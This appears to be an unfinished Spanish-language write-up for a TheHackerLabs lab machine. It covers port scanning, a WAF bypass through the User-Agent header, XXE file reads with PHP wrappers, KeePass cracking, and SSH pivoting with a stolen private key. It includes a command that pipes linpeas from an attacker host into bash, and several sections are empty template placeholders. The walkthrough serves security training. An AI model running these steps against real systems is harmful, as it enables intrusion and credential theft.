@@ -1,0 +1,756 @@
+---
+layout: single
+title: Emerreuvedoble - TheHackerLabs
+excerpt: "."
+date: 2025-07-07
+classes: wide
+header:
+  teaser: /assets/images/THL-writeup-/_logo.png
+  teaser_home_page: true
+  icon: /assets/images/thehackerlabs.jpeg
+categories:
+  - TheHackerLabs
+  - Medium Machine
+tags:
+  - Linux
+  - 
+  - 
+  - OSCP Style
+---
+![](/assets/images/THL-writeup-/_logo.png)
+
+texto
+
+Herramientas utilizadas:
+* *ping*
+* *nmap*
+* **
+* **
+* **
+* **
+
+
+<br>
+<hr>
+<div id="Indice">
+	<h1>Índice</h1>
+	<ul>
+		<li><a href="#Recopilacion">Recopilación de Información</a></li>
+			<ul>
+				<li><a href="#Ping">Traza ICMP</a></li>
+				<li><a href="#Puertos">Escaneo de Puertos</a></li>
+				<li><a href="#Servicios">Escaneo de Servicios</a></li>
+			</ul>
+		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#"></a></li>
+				<li><a href="#"></a></li>
+			</ul>
+		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#"></a></li>
+				<li><a href="#"></a></li>
+			</ul>
+		<li><a href="#Post">Post Explotación</a></li>
+			<ul>
+				<li><a href="#"></a></li>
+			</ul>
+		<li><a href="#Links">Links de Investigación</a></li>
+	</ul>
+</div>
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
+</div>
+<br>
+
+
+<h2 id="Ping">Traza ICMP</h2>
+
+Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
+```bash
+ping -c 4 192.168.10.170
+PING 192.168.10.170 (192.168.10.170) 56(84) bytes of data.
+64 bytes from 192.168.10.170: icmp_seq=1 ttl=64 time=1.67 ms
+64 bytes from 192.168.10.170: icmp_seq=2 ttl=64 time=1.15 ms
+64 bytes from 192.168.10.170: icmp_seq=3 ttl=64 time=0.917 ms
+64 bytes from 192.168.10.170: icmp_seq=4 ttl=64 time=0.854 ms
+
+--- 192.168.10.170 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3053ms
+rtt min/avg/max/mdev = 0.854/1.148/1.673/0.322 ms
+```
+Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.
+
+<br>
+
+<h2 id="Puertos">Escaneo de Puertos</h2>
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.170 -oG allPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 12:23 CST
+Initiating ARP Ping Scan at 12:23
+Scanning 192.168.10.170 [1 port]
+Completed ARP Ping Scan at 12:23, 0.07s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 12:23
+Scanning 192.168.10.170 [65535 ports]
+Discovered open port 22/tcp on 192.168.10.170
+Discovered open port 80/tcp on 192.168.10.170
+Discovered open port 22222/tcp on 192.168.10.170
+Completed SYN Stealth Scan at 12:23, 8.00s elapsed (65535 total ports)
+Nmap scan report for 192.168.10.170
+Host is up, received arp-response (0.00092s latency).
+Scanned at 2025-07-07 12:23:05 CST for 8s
+Not shown: 65532 closed tcp ports (reset)
+PORT      STATE SERVICE    REASON
+22/tcp    open  ssh        syn-ack ttl 64
+80/tcp    open  http       syn-ack ttl 63
+22222/tcp open  easyengine syn-ack ttl 63
+MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 8.25 seconds
+           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
+```
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
+| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
+| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
+| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
+| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
+| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
+| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
+| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
+
+Tenemos 3 puertos abiertos, pero me interesa bastante el **puerto 22222**.
+
+<br>
+
+<h2 id="Servicios">Escaneo de Servicios</h2>
+
+```bash
+nmap -sCV -p 22,80,22222 192.168.10.170 -oN targeted
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 12:25 CST
+Nmap scan report for 192.168.10.170
+Host is up (0.0014s latency).
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 16:a7:1b:4b:a7:6c:ae:4b:09:5a:22:28:98:32:9c:b0 (ECDSA)
+|_  256 a4:5e:6d:aa:a4:95:96:f1:3b:a4:fa:5a:ed:73:ac:cc (ED25519)
+80/tcp    open  http    Apache httpd 2.4.38
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.38 (Debian)
+22222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 a4:0e:43:ca:5c:dd:da:9d:63:12:f4:b5:c7:52:b1:e3 (RSA)
+|   256 fe:c2:ec:82:68:67:d0:27:c3:8b:7d:a1:13:06:d2:ec (ECDSA)
+|_  256 55:a6:b4:75:5f:41:61:08:bb:ba:3f:d1:c9:21:97:ff (ED25519)
+MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: Host: 172.200.5.5; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
+```
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
+| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
+| *-p*       | Para indicar puertos específicos. |
+| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
+
+Podemos ver que la página web activa en el **puerto 80**, muestra la página por defecto de **Apache2**. Además, no encontraremos nada si revisamos su código fuente.
+
+Observa la IP que se obtuvo del **servicio SSH** del **puerto 22222**, pues parece ser una IP de un **contenedor de Docker**. Quizá más adelante, lo podemos comprobar.
+
+Como no tenemos credenciales válidas o algún usuario al que podamos aplicarle fuerza bruta para el **servicio SSH**, vamos a aplicar **Fuzzing** a la página web, pues puede que tenga algún directorio o archivo oculto por ahí.
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
+</div>
+<br>
+
+
+<h2 id="fuzz">Fuzzing</h2>
+
+Cuando intentamos aplicar **Fuzzing** como normalmente hacemos, no solo no encontrara nada, sino que tendremos que aplicar un filtro para que evite ciertas respuestas, de lo contrario, obtendremos esta clase de respuestas:
+```bash
+download                [Status: 403, Size: 398, Words: 35, Lines: 12, Duration: 79ms]
+news                    [Status: 403, Size: 398, Words: 35, Lines: 12, Duration: 79ms]
+crack                   [Status: 403, Size: 398, Words: 35, Lines: 12, Duration: 79ms]
+14                      [Status: 403, Size: 398, Words: 35, Lines: 12, Duration: 36ms]
+```
+Y aun con los filtros, no encontraremos nada.
+
+El simple hecho de que se necesiten filtros, ya nos dice que algo esta pasando aquí.
+
+Observa lo que pasa si intentamos obtener información de la página web con **whatweb**:
+```bash
+whatweb http://192.168.10.170
+http://192.168.10.170 [403 Forbidden] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.10.170], Title[403 Forbidden]
+```
+Nos da una respuesta **Forbidden**, por lo que parece que no esta analizando bien la página por alguna razón.
+
+Puede que este activo un **WAF**, lo que podemos comprobar con la herramienta **wafw00f**:
+```bash
+wafw00f http://192.168.10.170
+
+                 ?              ,.   (   .      )        .      "
+         __        ??          ("     )  )'     ,'        )  . (`     '`
+    (___()'`;   ???          .; )  ' (( (" )    ;(,     ((  (  ;)  "  )")
+    /,___ /`                 _"., ,._'_.,)_(..,( . )_  _' )_') (. _..( ' )
+    \\   \\                 |____|____|____|____|____|____|____|____|____|
+
+                                ~ WAFW00F : v2.3.1 ~
+                    ~ Sniffing Web Application Firewalls since 2014 ~
+
+[*] Checking http://192.168.10.170
+[+] Generic Detection results:
+[*] The site http://192.168.10.170 seems to be behind a WAF or some sort of security solution
+[~] Reason: The response was different when the request wasn't made from a browser.
+Normal response code is "200", while the response code to a modified request is "403"
+[~] Number of requests: 4
+```
+Una forma en la que podemos aplicar un Bypass para que nos permita aplicar **Fuzzing**, es utilizar la **cabecera User-Agent** legitima.
+
+Esta la podemos obtener desde **BurpSuite** al capturar la página:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-emerreuvedoble/Captura1.png">
+</p>
+
+Copia esa cabecera y agregala como otra flag en el comando de **ffuf**. Con esto, ya obtendremos un resultado:
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.10.170/FUZZ -t 300 -fs 398 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.10.170/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 300
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 398
+________________________________________________
+
+services                [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 5561ms]
+                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 47ms]
+server-status           [Status: 403, Size: 212, Words: 29, Lines: 11, Duration: 44ms]
+:: Progress: [220545/220545] :: Job [1/1] :: 258 req/sec :: Duration: [0:02:41] :: Errors: 8 ::
+```
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+| *-u*       | Para indicar la URL a utilizar. |
+| *-t*       | Para indicar la cantidad de hilos a usar. |
+| *-fs*	     | Para filtrar y no mostrar un tamaño de respuesta especifico. |
+| *-H*	     | Para utilizar una cabecera User-Agent personalizada. |
+
+<br>
+
+Ahora, probemos con **gobuster**:
+```bash
+gobuster dir -u http://192.168.10.170/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 --exclude-length 398 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.10.170/
+[+] Method:                  GET
+[+] Threads:                 300
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] Exclude Length:          398
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/services             (Status: 301) [Size: 319] [--> http://192.168.10.170/services/]
+/server-status        (Status: 403) [Size: 212]
+Progress: 220559 / 220560 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-u*       | Para indicar la URL a utilizar. |
+| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+| *-t*       | Para indicar la cantidad de hilos a usar. |
+| *--exclude-length* | Para filtrar y no mostrar un tamaño de respuesta especifico. |
+| *-H*       | Para utilizar una cabecera User-Agent personalizada. |
+
+<br>
+
+Descubrimos un directorio, vamos a visitarlo:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-emerreuvedoble/Captura2.png">
+</p>
+
+Parece ser una página para envio de paquetes.
+
+Analicemosla.
+
+<br>
+
+<h2 id="Envio">Analizando Página de Envios de Paquetes</h2>
+
+Revisando su código fuente, podemos ver como funciona la página:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-emerreuvedoble/Captura3.png">
+</p>
+
+Vemos que el formulario esta obteniendo los datos que introduzcamos, pero no se ve que se aplique una sanitización.
+
+Además, ahí esta vemos un script que realiza las acciones del formulario.
+
+Por lo que entiendo, el script hace lo siguiente:
+* Obtiene los datos que se introduzcan en los campos del formulario.
+* Crea un **documento XML** y un nodo raíz llamado **formData**. Este nodo, obtiene los valores del formulario y crea una **etiqueta XML** por cada clave valor, por ejemplo `nombre:pepito`, etc.
+* Después, serializa el **documento XML** a una cadena de texto para enviarlo a un servidor.
+* Por último, envia el **XML** mediante una **petición POST** a **procesar_envio.php** y establece la cabecera `Content-Type:application/xml`, para indicar que esta enviando un **XML**. Además, genera un mensaje sobre si se envio o no la petición.
+
+Podemos comprobar con **BurpSuite** como se crea el **XML** a enviar:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-emerreuvedoble/Captura4.png">
+</p>
+
+Gracias a este análisis, sabemos que es posible que la página web sea vulnerable al **ataque XXE**.
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
+</div>
+<br>
+
+
+<h2 id="XXE">Aplicando XML External Entity (XXE) para Leer Archivos Internos</h2>
+
+Aquí puedes ver un blog de la academia de **PortSwigger** que explica muy bien que es el **ataque XXE** y sus variantes:
+* <a href="https://portswigger.net/web-security/xxe" target="_blank">PortSwigger: XXE</a>
+
+De este blog, ocuparemos el siguiente payload que nos permitira leer el archivo `/etc/passwd` y posiblemente otros:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-emerreuvedoble/Captura5.png">
+</p>
+
+Vamos a pegarlo en la petición y a modificarlo para que cumpla con los mismos datos usados en la petición original, quedando de esta forma:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-emerreuvedoble/Captura6.png">
+</p>
+
+Funcionó correctamente.
+
+Entonces, es posible que podamos ver el contenido de otros archivos y uno que nos interesa, es el `/etc/hosts`, pues puede que hayan registrado ahí algún contenedor que sirva de servidor:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-emerreuvedoble/Captura7.png">
+</p>
+
+Muy bien, no solamente vemos un servidor registrado, sino que hay un dominio de un **servidor FTP** registrado ahí.
+
+Algo que podemos hacer, es tratar de ver el archivo **procesar_envio.php** al que hace referencia el script del formulario.
+
+El problema es que al apuntar a este, no veremos nada:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-emerreuvedoble/Captura8.png">
+</p>
+
+Para estos casos, podemos utilizar un **PHP Wrapper** que codifique el archivo en **base64** para que podamos decodificarlo en nuestra máquina.
+
+<br>
+
+<h2 id="PHPWrapper">Aplicando XXE y PHP Wrappers para Leer Archivos de PHP</h2>
+
+Aquí puedes encontrar algunos payloads de **XXE** que incluyen **PHP Wrappers**:
+* <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#php-wrapper-inside-xxe" target="_blank">PayloadAllTheThings: XML External Entity</a>
+
+Aplicaremos el siguiente payload:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-emerreuvedoble/Captura9.png">
+</p>
+
+Modifiquemos nuestro payload actual y enviemos la petición:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-emerreuvedoble/Captura10.png">
+</p>
+
+Excelente, obtuvimos un código codificado en base64, así que vamos a decodificarlo:
+```bash
+echo -n "PD9waHAKbGlieG1sX2Rpc2FibGVfZW50aXR5X2x.." | base64 -d
+<?php
+libxml_disable_entity_loader (false);
+
+if ($_SERVER["REQUEST_METHOD"] == "POST" && strpos($_SERVER["CONTENT_TYPE"], "application/xml") !== false) {
+    // Get the raw POST data
+    $rawData = file_get_contents("php://input");
+
+    // Load the XML
+    $dom = new DOMDocument();
+    $dom->substituteEntities = true;
+    $dom->loadXML($rawData);
+
+    $xml = simplexml_import_dom($dom);
+
+    // Extract data from XML
+    $nombre = $xml->nombre;
+    $direccion = htmlspecialchars($xml->direccion);
+    $poblacion = htmlspecialchars($xml->poblacion);
+    $cp = htmlspecialchars($xml->cp);
+
+    /*
+
+Encuentra el fichero passwords.kdb ¿Estará en esta máquina o en otra?
+
+    */
+
+    // Display the data
+    echo "<h1>Datos</h1>";
+    echo "Nombre: " . $nombre . "<br>";
+    echo "Dirección: " . $direccion . "<br>";
+    echo "Población: " . $poblacion . "<br>";
+    echo "Código postal: " . $cp . "<br>";
+} else {
+    echo "Invalid request.";
+}
+?>
+```
+Observa ese comentario, parece que existe un archivo llamado **passwords.kdb** que de **KeePass**. Puede que ahí encontremos alguna credencial de acceso para el **servicio SSH**.
+
+El problema es que no sabemos donde esta y buscando por varios directorios comunes, no encontramos nada.
+
+Algo que podemos probar es el **servicio FTP** activo, puede que este ahí este archivo.
+
+Vamos a comprobarlo:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-emerreuvedoble/Captura11.png">
+</p>
+
+Obtuvimos el contenido del archivo, intentemos decodificarlo:
+```bash
+echo -n "A9mimmX7S7UCAAAAAgADA..." | base64 -d
+٢�e�K�␦��Kk9e|��W'�X2�WZ���ߌZz~ѷ����{~�ٛ����q�ڑ���y��~��܃�C�ś�ſ]��g`	����I�\8}�a���krmg�P�� |1����
+```
+Cierto, es un archivo cifrado.
+
+<br>
+
+<h2 id="KeePass">Crackeando Archivo de Base de Datos de KeePass</h2>
+
+Vamos a guardar el contenido en un archivo y obtengamos el hash de este archivo con la herramienta **keepass2john**:
+```bash
+echo -n "A9mimmX7S7UCAAAAAgADA..." | base64 -d > passwords.kdb
+
+keepass2john passwords.kdb > hash
+Inlining passwords.kdb
+```
+
+Ahora, crakeamos este archivo con **JohnTheRipper**:
+```bash
+john -w:/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 50000 for all loaded hashes
+Cost 2 (version) is 1 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+diamonds         (passwords.kdb)     
+1g 0:00:00:03 DONE (2025-07-07 16:02) 0.3086g/s 296.2p/s 296.2c/s 296.2C/s blonde..sandy
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+Excelente, tenemos la contraseña de este archivo.
+
+Para abrirlo con **KeePassXC**, necesitamos importar este archivo a la versión 1 de **KeePass**, dandole la ruta del archivo y la contraseña:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-emerreuvedoble/Captura12.png">
+</p>
+
+Le damos a continuar y veremos el contenido de este archivo:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-emerreuvedoble/Captura13.png">
+</p>
+
+Ya solamente, importamos por completo el archivo y abrimos esa base de datos:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-emerreuvedoble/Captura14.png">
+</p>
+
+Tenemos la contraseña del **usuario pepita**.
+
+Estas credenciales, servirán con el **servicio SSH** del **puerto 22222**:
+```bash
+ssh pepita@192.168.10.170 -p 22222
+pepita@192.168.10.170's password: 
+Linux webserver 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64
+...
+pepita@webserver:~$ whoami
+pepita
+pepita@webserver:~$ hostname -I
+172.200.5.5
+```
+Estamos dentro del contenedor.
+
+Aquí podemos encontrar la flag del usuario:
+```bash
+pepita@webserver:~$ ls
+user.txt
+pepita@webserver:~$ cat user.txt
+...
+```
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
+</div>
+<br>
+
+
+<h2 id="">Enumeración de Contenedor Docker</h2>
+
+No tenemos el comando **sudo**, por lo que no sabemos que privilegios tenemos:
+```bash
+pepita@webserver:~$ sudo -l
+-bash: sudo: command not found
+```
+
+Busquemos si hay algún binario con **permisos SUID**:
+```bash
+pepita@webserver:~$ find / -perm -4000 2>/dev/null
+/bin/su
+/bin/umount
+/bin/mount
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+```
+No hay alguno que podamos usar.
+
+Al no encontrar algo más, utilicemos la herramienta **linpeas.sh**. Puedes descargarla aquí:
+* <a href="https://github.com/peass-ng/PEASS-ng/tree/master" target="_blank">Repositorio de peass-ng: linpeas.sh</a>
+
+En mi caso, no lo voy a descargar, sino ejecutarlo de manera remota utilizando un servidor de **Python3** en mi máquina:
+```bash
+pepita@webserver:~$ curl http://Tu_IP/linpeas.sh | bash
+```
+
+Observa lo siguiente:
+```bash
+╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
+/dev/mqueue
+/dev/shm
+/home/pepita
+/host/juanita
+/host/juanita/.bash_logout
+/host/juanita/.bashrc
+/host/juanita/.profile
+/host/juanita/.ssh
+/host/juanita/.ssh/authorized_keys
+/host/juanita/.ssh/id_rsa
+/run/lock
+/tmp
+/var/lib/php/sessions
+/var/tmp
+```
+Parece que hay archivos de otro usuario en el directorio `/host`, y ahí vemos una llave **id_rsa**.
+
+De igual forma, vemos el directorio docker
+```bash
+pepita@webserver:~$ ls -la /host/juanita/
+total 28
+drwx------ 4 pepita pepita 4096 May 23  2024 .
+drwxr-xr-x 3 root   root   4096 May 23  2024 ..
+lrwxrwxrwx 1 root   root      9 May 23  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 pepita pepita  220 May 23  2024 .bash_logout
+-rw-r--r-- 1 pepita pepita 3526 May 23  2024 .bashrc
+-rw-r--r-- 1 pepita pepita  807 May 23  2024 .profile
+drwx------ 2 pepita pepita 4096 May 24  2024 .ssh
+drwxr-xr-x 4 root   root   4096 May 23  2024 docker
+```
+
+
+Podemos leer la **llave privada id_rsa**:
+```bash
+pepita@webserver:/host/juanita$ cat .ssh/id_rsa 
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ
+```
+
+Lo curioso es que si la copiamos en nuestra máquina e intentamos obtener su hash con **ssh2john**, nos dirá que no tiene una contraseña:
+```bash
+nano id_rsa
+chmod 600 id_rsa
+ssh2john id_rsa > hash
+id_rsa has no password!
+```
+Esto quiere decir que no se uso una contraseña para cifrar la llave, entonces, podemos usar esa llave sin ninguna restricción.
+
+Probémoslo:
+```bash
+ssh -i id_rsa juanita@192.168.10.170
+Linux emerreuvedoble 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64
+
+███╗   ███╗██████╗ ██╗   ██╗██╗   ██╗
+████╗ ████║██╔══██╗██║   ██║██║   ██║
+██╔████╔██║██████╔╝██║   ██║██║   ██║
+██║╚██╔╝██║██╔══██╗╚██╗ ██╔╝╚██╗ ██╔╝
+██║ ╚═╝ ██║██║  ██║ ╚████╔╝  ╚████╔╝ 
+╚═╝     ╚═╝╚═╝  ╚═╝  ╚═══╝    ╚═══╝  
+                                     
+
+Last login: Tue Jul  8 00:24:23 2025
+juanita@emerreuvedoble:~$ whoami
+juanita
+```
+Estamos dentro de la máquina víctima.
+
+<br>
+
+<h2 id=""></h2>
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+<br>
+
+<h2 id=""></h2>
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+
+<br>
+<br>
+<div style="position: relative;">
+  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
+</div>
+
+
+links
+
+
+<br>
+# FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
